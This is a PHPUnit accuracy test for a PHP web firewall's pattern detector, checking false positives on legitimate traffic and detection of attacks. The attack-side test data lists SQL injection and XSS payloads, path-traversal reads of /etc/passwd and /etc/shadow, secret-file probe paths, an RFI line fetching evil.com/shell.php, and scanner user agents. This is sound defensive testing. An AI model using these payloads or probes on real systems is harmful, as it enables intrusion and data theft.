<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;
use Webrium\XZeroProtect\PatternDetector;

/**
 * Accuracy suite for the detection modules.
 *
 * Every case here is traffic a real content site produces, or an attack a real
 * scanner sends. A firewall that blocks the first group is worse than no
 * firewall: it 403s paying visitors and, through auto_ban, locks them out for
 * a day.
 */
class DetectionAccuracyTest extends TestCase
{
    private PatternDetector $detector;

    protected function setUp(): void
    {
        $this->detector = new PatternDetector(dirname(__DIR__) . '/rules');
    }

    // =========================================================================
    // Paths — ordinary content must not look like an attack
    // =========================================================================

    /**
     * @dataProvider legitimatePaths
     */
    public function test_legitimate_path_is_not_suspicious(string $path, string $why): void
    {
        $this->assertFalse($this->detector->isSuspiciousPath($path), $why);
    }

    public static function legitimatePaths(): array
    {
        return [
            'article about wordpress'   => ['/posts/wordpress-security-vulnerabilities-2026', 'a slug that mentions a CMS is not an attack'],
            'migration guide'           => ['/posts/migrating-from-wordpress-to-nitrocode', 'same'],
            'article about phpmyadmin'  => ['/posts/how-to-secure-phpmyadmin', 'same'],
            'article about phpinfo'     => ['/posts/how-to-read-phpinfo-output', 'same'],
            'cms comparison'            => ['/posts/drupal-vs-typo3-comparison', 'same'],
            'webshell explainer'        => ['/blog/what-is-a-webshell', 'same'],
            'monitoring guide'          => ['/posts/nginx-server-status-monitoring', 'same'],
            'changelog page'            => ['/changelog', 'a changelog page is standard on a software site'],
            'administrator role page'   => ['/docs/roles/administrator', 'a documentation page about roles'],
            'category listing'          => ['/category/wordpress', 'a tag or category named after a CMS'],
            'clean route'               => ['/user/dashboard', 'control'],
        ];
    }

    /**
     * The path check must look at the path, not the query string. Attacks in
     * query values are the payload scanner's job.
     *
     * @dataProvider legitimateQueries
     */
    public function test_query_string_does_not_trigger_the_path_check(string $uri, string $why): void
    {
        $this->assertFalse($this->detector->isSuspiciousPath($uri), $why);
    }

    public static function legitimateQueries(): array
    {
        return [
            'site search'      => ['/search?q=wordpress', 'searching your own site must not 403 the visitor'],
            'search phrase'    => ['/search?q=phpmyadmin+backup', 'same'],
            'filter parameter' => ['/users?role=administrator', 'a role filter is not an attack'],
        ];
    }

    /**
     * @dataProvider scannerPaths
     */
    public function test_scanner_path_is_still_blocked(string $path): void
    {
        $this->assertTrue($this->detector->isSuspiciousPath($path), 'must keep catching real probes');
    }

    public static function scannerPaths(): array
    {
        return [
            ['/wp-admin/setup-config.php'],
            ['/wp-admin/'],
            ['/WP-ADMIN/install.php'],
            ['/wp-login.php'],
            ['/xmlrpc.php'],
            ['/wordpress/wp-admin/'],
            ['/phpmyadmin/index.php'],
            ['/.env'],
            ['/.env.bak'],
            ['/.git/config'],
            ['/backup.sql'],
            ['/db.bak'],
            ['/shell.php'],
            ['/../../etc/passwd'],
            ['/wp-admin%2Fsetup-config.php'],
            ['/vendor/phpunit/eval-stdin.php'],
        ];
    }

    // =========================================================================
    // Payloads — the text your visitors actually submit
    // =========================================================================

    /**
     * @dataProvider legitimateText
     */
    public function test_legitimate_text_is_not_a_payload(string $input, string $why): void
    {
        $this->assertNull($this->detector->detectPayload($input), $why);
    }

    public static function legitimateText(): array
    {
        return [
            'marketing sentence'  => ['Select a plan from the list below', 'ordinary English contains SELECT ... FROM'],
            'sentence with insert'=> ['We insert into the database nightly', 'same for INSERT INTO'],
            'csharp comment'      => ["I'm learning C# and Java", 'a hash followed by a space is not a SQL comment'],
            'markdown heading'    => ["# Getting started\nWelcome", 'markdown headings start with hash-space'],
            'em dash text'        => ['Order #42 -- shipped yesterday', 'double hyphen is ordinary punctuation'],
            'link to html page'   => ['Read more at https://example.com/docs/index.html', 'a link is not remote file inclusion'],
            'link to txt file'    => ['Download guide at https://example.com/guide.txt', 'links to text files are not remote file inclusion'],
            'relative path prose' => ['Check image at ../images/logo.png', 'relative paths in prose/forms are not attacks'],
            'code import path'    => ['import { config } from "../config.js";', 'relative module imports are common in code snippets'],
            'shell cd tutorial'   => ['Run cd ../../my-project to go up', 'path navigation in tutorials is not an attack'],
            'semicolon then id'   => ['Please send your ID; identity check required', 'not command injection'],
            'semicolon then cat'  => ['tags=music; categories=rock', 'same'],
            'word ending in system'=> ['The ecosystem(2026) report', 'ecosystem is not system()'],
            'blog post about js'  => ['eval( is a dangerous JS function', 'writing about code is not running code'],
            'persian text'        => ['سلام، لطفاً یک طرح از لیست زیر انتخاب کنید', 'control'],
        ];
    }

    /**
     * @dataProvider realPayloads
     */
    public function test_real_payload_is_detected(string $input, string $why): void
    {
        $this->assertNotNull($this->detector->detectPayload($input), $why);
    }

    public static function realPayloads(): array
    {
        return [
            'classic union'      => ["1' UNION SELECT password FROM users--", 'baseline'],
            'inline comment sqli'=> ['1 UNION/**/SELECT/**/password', 'comment-obfuscated'],
            'boolean sqli'       => ["admin' oR 1=1#", 'mixed case'],
            'script tag'         => ['<script>alert(1)</script>', 'baseline'],
            'script slash'       => ['<script/x>alert(1)</script>', 'slash instead of whitespace'],
            'onbegin handler'    => ['<svg><animate onbegin=alert(1)>', 'handler outside the hardcoded list'],
            'lfi etc passwd'     => ['../../etc/passwd', 'LFI attack targeting /etc/passwd'],
            'lfi shadow'         => ['/etc/shadow', 'LFI attack targeting /etc/shadow'],
            'rfi remote php'     => ['?file=http://evil.com/shell.php', 'RFI attack with remote script in parameter'],
            'encoded sqli'       => ['1%27+OR+%271%27%3D%271', 'still encoded when it reaches the scanner'],
        ];
    }

    // =========================================================================
    // User-Agent
    // =========================================================================

    public function test_absent_user_agent_is_not_treated_as_an_attack(): void
    {
        // Feed readers, monitoring probes, and some proxies send no UA. Blocking
        // them is one thing; feeding auto_ban with it is another.
        $this->assertFalse(
            $this->detector->isSuspiciousAgent(''),
            'an absent UA is unusual, not hostile — it must not be an auto-ban violation'
        );
    }

    /**
     * @dataProvider scannerAgents
     */
    public function test_scanner_user_agent_is_blocked(string $ua): void
    {
        $this->assertTrue($this->detector->isSuspiciousAgent($ua));
    }

    public static function scannerAgents(): array
    {
        return [['sqlmap/1.7'], ['Nikto/2.5'], ['Mozilla/5.0 zgrab/0.x'], ['masscan/1.3']];
    }

    /**
     * @dataProvider realBrowsers
     */
    public function test_real_browser_is_not_blocked(string $ua): void
    {
        $this->assertFalse($this->detector->isSuspiciousAgent($ua));
    }

    public static function realBrowsers(): array
    {
        return [
            ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'],
            ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1'],
            ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0'],
        ];
    }
}
